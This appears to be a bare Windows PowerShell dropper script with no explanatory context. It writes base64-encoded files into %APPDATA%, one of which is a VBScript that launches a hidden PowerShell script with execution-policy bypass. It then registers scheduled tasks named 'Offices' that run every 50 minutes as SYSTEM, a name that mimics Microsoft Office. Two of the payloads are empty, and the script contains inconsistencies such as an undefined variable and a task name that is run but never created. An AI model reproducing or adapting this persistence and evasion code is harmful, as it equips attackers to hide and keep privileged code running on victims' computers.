######  VB File  #####
$filepath1 = $env:APPDATA + "\settings.in"
######  PS1 (vb) File  #####
$filepath2 = $env:APPDATA + "\settings.ps1"
######  Ps1 (else) File  #####
$filepath3 = $env:APPDATA + "\stick.ps1"

Remove-Item -path $filepath1 -Force
Remove-Item -path $filepath2 -Force

$res  = [System.Convert]::FromBase64String("U2V0IHdTaGVsbD1DcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKQ0KZmFybiA9IHdTaGVsbC5FeHBhbmRFbnZpcm9ubWVudFN0cmluZ3MoIiVhcHBkYXRhJSIpDQoNCm93dyA9IHNhcG9qZGtzaiArICJcc2V0dGluZ3MucHMxIg0KcGF0aCA9ICJwb3dlcnNoZWxsLmV4ZSAtZXhlY3V0aW9ucG9saWN5IGJ5cGFzcyAtRmlsZSAiICsgb3d3DQoNCndTaGVsbC5SdW4gcGF0aCwgMA0K")
$r=[System.Text.Encoding]::UTF8.GetString($res)
$r >> $filepath1
	
$res  = [System.Convert]::FromBase64String("")
$r=[System.Text.Encoding]::UTF8.GetString($res)
$r >> $filepath2

$res  = [System.Convert]::FromBase64String("")
$r=[System.Text.Encoding]::UTF8.GetString($res)
$r >> $filepath3

$ws = "wscript //e:vbscript " + $filepath1
$ws1 = "wscript //e:vbscript " + $filepath2

schtasks /create /tn "Offices" /tr $ws /sc minute /mo 50 /ru System /F
schtasks /create /tn "Offices" /tr $ws1 /sc minute /mo 50 /ru System /F

schtasks /run /tn "Offices"
sleep 5
schtasks /run /tn "OfficeUpdate"
